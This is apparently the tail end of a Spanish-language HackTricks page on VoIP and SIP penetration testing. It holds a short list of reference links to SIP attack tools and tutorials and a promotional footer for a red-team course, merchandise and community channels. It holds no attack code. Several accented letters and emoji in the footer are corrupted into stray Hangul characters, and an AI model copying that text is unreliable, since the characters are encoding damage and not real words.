* [https://github.com/Pepelux/sippts/wiki](https://github.com/Pepelux/sippts/wiki)
* [http://blog.pepelux.org/](http://blog.pepelux.org/)
* [https://www.rtpbleed.com/](https://www.rtpbleed.com/)
* [https://medium.com/vartai-security/practical-voip-penetration-testing-a1791602e1b4](https://medium.com/vartai-security/practical-voip-penetration-testing-a1791602e1b4)
* [https://resources.enablesecurity.com/resources/sipdigestleak-tut.pdf](https://resources.enablesecurity.com/resources/sipdigestleak-tut.pdf)

<details>

<summary><strong>Aprende hacking en AWS desde cero hasta experto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF**, 춰consulta los [**PLANES DE SUSCRIPCI칍N**](https://github.com/sponsors/carlospolop)!
* Obt칠n el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci칩n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **칔nete al** 游눫 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s칤gueme** en **Twitter** 游냕 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PR a** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
